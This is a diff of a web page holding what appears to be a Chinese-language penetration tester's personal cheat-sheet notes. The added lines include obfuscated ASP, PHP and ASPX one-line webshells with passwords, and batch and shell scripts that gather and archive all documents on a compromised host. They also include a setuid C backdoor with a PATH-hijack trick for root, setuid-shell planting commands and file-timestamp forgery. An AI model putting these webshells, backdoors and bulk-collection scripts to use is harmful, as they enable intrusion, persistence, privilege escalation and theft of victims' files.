@@ -118,7 +118,7 @@
 
       <div class="read-time">
         <small>
-          15 minute read
+          20 minute read
         </small>
       </div>
 
@@ -147,7 +147,7 @@
     先通过一些数据链路连接到vpn，然后vpn作为代理再访问互联网。
 <span class="p">11.</span>tar - T mulu.list - czf file.tar.gz
 <span class="p">12.</span>分割大文件再合并
-    split - b 20m RevolutionOS.rmvb RevOS_part_,
+    split -b 20m RevolutionOS.rmvb RevOS_part_,
     cat RevOS_part_ <span class="err">*</span> &gt; RevolutionOS_RSB.rmvb,
     md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
 <span class="p">13.</span>一些数据库操作
@@ -236,6 +236,20 @@
             webacoo
             weevely
    asp:
+   <span class="err">&lt;</span>%execute(unescape("eval%20request%28%222016%22%29"))%&gt;          key:2016
+
+   &lt;%
+   dim a,b,temp,c
+   a="eva@@l%20req@@uest%28%22helloxj%22%29"
+   b=replace(a,"@@","零")
+   c=split(b,"零")
+   for i=0 to ubound(c)
+   temp=temp+c(i)
+   next
+   execute(unescape(temp))
+   %&gt;
+                        key:helloxj
+
    <span class="err">&lt;</span>%Y=request("shezhang")%&gt;<span class="err">&lt;</span>%execute(Y)%&gt;
     
    <span class="err">&lt;</span>%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("shezhang"))%&gt;
@@ -243,6 +257,8 @@
    <span class="err">&lt;</span>%eval""<span class="err">&amp;</span>("e"<span class="err">&amp;</span>"v"<span class="err">&amp;</span>"a"<span class="err">&amp;</span>"l"<span class="err">&amp;</span>"("<span class="err">&amp;</span>"r"<span class="err">&amp;</span>"e"<span class="err">&amp;</span>"q"<span class="err">&amp;</span>"u"<span class="err">&amp;</span>"e"<span class="err">&amp;</span>"s"<span class="err">&amp;</span>"t"<span class="err">&amp;</span>"("<span class="err">&amp;</span>"0"<span class="err">&amp;</span>"-"<span class="err">&amp;</span>"2"<span class="err">&amp;</span>"-"<span class="err">&amp;</span>"5"<span class="err">&amp;</span>")"<span class="err">&amp;</span>")")%&gt;（密码是-7）
 
    php:
+   <span class="cp">&lt;?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?&gt;</span>       key:g
+   <span class="cp">&lt;?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?&gt;</span>        key:the value of "a"
    <span class="cp">&lt;?php$a=str_replace(x,"","axsxxsxexrxxt");$a($_POST["shezhang"]);?&gt;</span>
     
    <span class="cp">&lt;?php$lang=(string)key($_POST);$lang($_POST['shezhang']);?&gt;</span>
@@ -301,6 +317,8 @@
    <span class="nt">&lt;script</span><span class="na">language=</span><span class="s">"C#"</span><span class="na">runat=</span><span class="s">"server"</span><span class="nt">&gt;</span>      
    WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y("add6bb58e139be10");      
    <span class="nt">&lt;/script&gt;</span>                              密码是webadmin
+
+   aspx隐藏一句话新：http://z-cg.com/?mod=pad<span class="ni">&amp;act=view&amp;id=10(&lt;%WebServices.ShowRunnerVersion();</span>%&gt;,<span class="err">&lt;</span>%WebServices.InitializeWebServices("fuck");%&gt;)
 <span class="p">31.</span>windows local privileges:http://www.52wa.net/post-198.html
                             http://le4f.net/post/post/windows-x64-local-privilege-escalation
                             https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=9067#lastpost
@@ -390,19 +408,94 @@
    find . -name "<span class="ge">*.doc" &gt; doc.list;find . -name "*</span>.docx" &gt; docx.list;find . -name "<span class="ge">*.pdf" &gt; pdf.list;find . -name "*</span>.txt" &gt; txt.list;find . -name "<span class="ge">*.xls" &gt; xls.list;find . -name "*</span>.xlsx" &gt; xlsx.list;find . -name "<span class="ge">*.jpg" &gt; jpg.list;find . -name "*</span>.png" &gt; png.list
    tar -czf code.tar.gz <span class="err">*</span>;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz
 
-   simple version:(without txt..)
-   find . -name "<span class="ge">*.doc" &gt; doc.list;find . -name "*</span>.docx" &gt; docx.list;find . -name "<span class="ge">*.pdf" &gt; pdf.list;find . -name "*</span>.xls" &gt; xls.list;find . -name "<span class="ge">*.xlsx" &gt; xlsx.list;tar -czf code.tar.gz *</span>;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz
+   recently I found command1;command2 performs not good to search all files in webshell's upon commonds,better to execute comman1 &amp;&amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:
 
-   windows:
-   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo "yes" | for /r f:<span class="se">\ </span>%i in (<span class="ge">*.doc,*</span>.docx,<span class="ge">*.pdf,*</span>.xls,<span class="err">*</span>.xlsx) do copy %i f:<span class="se">\w</span>eb_r
+   find . -name "<span class="ge">*.doc" &gt; doc.list &amp;&amp; find . -name "*</span>.docx" &gt; docx.list &amp;&amp; find . -name "<span class="ge">*.pdf" &gt; pdf.list &amp;&amp; find . -name "*</span>.txt" &gt; txt.list &amp;&amp; find . -name "<span class="ge">*.xls" &gt; xls.list &amp;&amp; find . -name "*</span>.xlsx" &gt; xlsx.list
+   tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz
+
+   or:
+   mkdir /tmp/tmp
+   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list''' &gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+   tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz
+
+   sometimes when try to execute in this way:
+   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list''' &gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+
+   may found it didn't succeed to create list file except for doc.list,then try useing normal webshell's terminal to execute the one without root privilege in one of upon ways<span class="sb">
+
+
+</span>   windows:
+   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo "yes" | for /r f:<span class="se">\ </span>%i in (<span class="ge">*.doc,*</span>.docx,<span class="ge">*.pdf,*</span>.xls,<span class="ge">*.xlsx,*</span>.txt) do copy "%i" f:<span class="se">\w</span>eb_r
    E:<span class="se">\R</span>ECYCLER<span class="se">\R</span>ar.exe a -k -r -s -m1 E:<span class="se">\w</span>wwroot<span class="se">\W</span>eb<span class="se">\w</span>eb.rar E:<span class="se">\w</span>wwroot<span class="se">\W</span>eb<span class="err">\</span>
+   7z.exe a -t7z -p123456 c:<span class="se">\t</span>est.7z c:<span class="se">\t</span>est<span class="se">\*</span>.<span class="err">*</span>
    del /f/q folder
    rar a /v20m /m0 newfilename web.rar
    windows find web.config==&gt;for /r c:<span class="se">\h</span>ttp<span class="se">\ </span>%i in (web.conf?g) do (echo <span class="gs">****</span><span class="ge">*filepath*</span><span class="gs">****</span> &gt;&gt; tmp.txt &amp;&amp; echo %i &gt;&gt; tmp.txt &amp;&amp; type "%i" &gt;&gt; tmp.txt &gt;&gt; tmp.txt &amp;&amp; echo. &gt;&gt; tmp.txt)
    windows bat批处理for用法：http://blog.csdn.net/wh_19910525/article/details/7912440
 
    findstr /R ".<span class="ge">*sa.*</span>" c:<span class="se">\1\*</span> &gt; tmp.txt
-<span class="p">41.</span>kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
+   powershell:dir –r | select-string "root"
+
+   windows打包(7z)命令：1.bat
+   ---------------content of 1.bat--------------------------
+    @echo off
+    goto :main
+    这是注释：(for /f "delims="的作用为取消默认的以空格等符号作为分割符
+    dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
+    :main
+    set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+    rd /s/q c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    md c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    echo  当前硬盘的分区有： 
+    for %%i in (%str%) do (
+    if exist %%i: (echo %%i:
+    
+    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.doc"') do (
+    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    echo %%j &gt;&gt; tmp.txt
+    )
+    
+    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.docx"') do (
+    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+    )
+    
+    
+    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.pdf"') do (
+    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+    )
+    
+    
+    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.txt"') do (
+    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+    )
+    
+    
+    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.xls"') do (
+    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+    )
+    
+    
+    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.xlsx"') do (
+    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+    )
+    
+    
+    )
+    )
+    
+    7z a -t7z C:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>est.7z C:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\*</span>.<span class="err">*</span>
+    ------------------end--------------------------------<span class="sb">
+
+    linux打包命令：1.sh(attention:without "&amp;&amp; echo ok",the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
+    -----------------content of 1.sh--------------------
+    mkdir /tmp/tmp &amp;&amp; find / -name "*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*.xlsx" &gt; /tmp/tmp/xlsx.list &amp;&amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;&amp; echo ok
+    --------------------end-----------------------------
+</span><span class="p">41.</span>kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
 <span class="p">42.</span>http://www.orico.com.cn/   driver    
 <span class="p">43.</span>python中单引号，双引号，三引号http://blog.csdn.net/caianye/article/details/6638183       
 <span class="p">44.</span>mygoogle dork：
@@ -427,7 +520,7 @@
    2&gt;Tor-Browser洋葱浏览器自带tor，每次启动tor-browser时，它会启动它自带的tor，该tor默认端口是9150（老版本的是9050）
    3&gt;1中的tor和2中的tor功能完全一样，proxychains firefox等程序时对应的proxychains.conf里面的端口为9050，启动tor-browser浏览器后可用也可将proxychains.conf中端口改为9150,但tor-browser关闭后proxychains这样的代理设置会失效。
 <span class="p">50.</span>Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692
-<span class="p">51.</span>内网渗透https://www.91ri.org/tag/neiwang-hacker
+<span class="p">51.</span>shadow copy神器，可以复制使用中的文件，可拷贝数据库
 <span class="p">52.</span>php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
 <span class="p">53.</span>php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
 <span class="p">54.</span>php上传中%00截断的理解：
@@ -732,6 +825,13 @@
              http://www.1990day.com/regeorg-proxychains-gold-partner/
              http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
              http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
+             https://www.91ri.org/tag/neiwang-hacker
+             http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
+             http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
+   快速找出dc:
+            dsquery server(best)
+            nslookup -type=SRV _ldap._tcp.baidu.com
+            netdom query fsmo
 <span class="p">88.</span>ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
 <span class="p">89.</span>github pages+jekyll搭建个人博客：
         https://www.zhihu.com/question/20223939
@@ -784,6 +884,7 @@
                                     Shift_L: commit_code
                                     Shift_R: inline_ascii
                       --------------------end----------------------------
+    windows中rime词库文件位置：%APPDATA%<span class="se">\r</span>ime
 <span class="p">93.</span>windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;form=MSHOME
 <span class="p">94.</span>backdoor-factory用法:
 <span class="p">    1.</span>单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
@@ -801,6 +902,60 @@
     <span class="nt">&lt;/configuration&gt;</span>
    --------------------------end of content----------------
    then upon a strong webshell to my new created folder,found no more error.
+<span class="p">96.</span>百度云上传限制绕过:copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
+<span class="p">97.</span>windows中ping google &amp;&amp; ping baidu ==&gt;ping.bat:
+                                         cmd /k "ping www.google.com.hk &amp;&amp; ping www.baidu.com"
+   创建ping.bat文件的快捷方式，在快捷方式中添加快捷键.eg.ctrl+alt+p
+<span class="p">98.</span>linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid3.conf
+<span class="p">99.</span>booklist:http://www.jianshu.com/p/67e294106919
+<span class="p">100.</span>gdb:http://www.jianshu.com/p/f20b10ea9a61
+<span class="p">101.</span>study links:
+    http://www.shiyanbar.com/questions/733
+    http://ch3rish.lofter.com/post/1d503b96_791362d
+<span class="p">102.</span>linux中suid,sgid,sticky详解：http://crazyming.blog.51cto.com/1048571/467414
+    find / -type f -perm -4000 -ls &gt; tmp.txt   function:find suid files
+        find / -type f -perm -4000 -ls | grep "flag00" &gt; tmp.txt    function:find file has setuid=flag00
+    find / -type f -perm -2000 -ls &gt; tmp.txt   function:find sgid files
+    find / -perm -2 -type f -print             function:find files can be writeable by everyone
+        echo "/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh" &gt;&gt; writeable_file_if_it_is_from_any_autorun_directory
+        /tmp/.sh -p(this command to get a euid=root shell)
+<span class="p">103.</span>linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
+<span class="p">104.</span>one linux backdoor shell can be like this:(file.c)
+    #include <span class="nt">&lt;stdlib</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
+    #include <span class="nt">&lt;unistd</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
+    #include <span class="nt">&lt;string</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
+    #include <span class="nt">&lt;sys</span><span class="err">/</span><span class="na">types</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
+    #include <span class="nt">&lt;stdio</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
+    
+    int main(int argc, char <span class="gs">**argv, char **</span>envp)
+    {
+    	gid_t gid;
+    	uid_t uid;
+    	gid = getegid();
+    	uid = geteuid();
+    
+    	setresgid(gid, gid, gid);
+    	setresuid(uid, uid, uid);
+    
+    	system("/usr/bin/env echo &amp;&amp; echo runtime error.");
+    }<span class="sb">
+
+    to use this file as a root shell backdoor after got a root shell,
+    use root role execute:
+        gcc -o 1 file.c
+        mv 1 /bin/l2ping
+        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
+    use webshell role execute:
+        PATH=/tmp:$PATH
+        export PATH
+        echo $PATH(to check if /tmp is in $PATH)
+        ln -s /bin/sh /tmp/echo
+    then use webshell role to get a root privilege shell:
+        /bin/l2ping
+</span><span class="p">105.</span>linux中修改文件时间
+    同时修改文件的修改时间和访问时间
+    touch -d "2010-05-31 08:10:30" test.doc
+<span class="p">106.</span>rime全角到半角解决方法:如果主机突然变成全角而无法变回半角，从任意地方中复制一个正常的半角字符串到主机中任意地方即可，不用重启
 </code></pre>
 </div>
 </span>
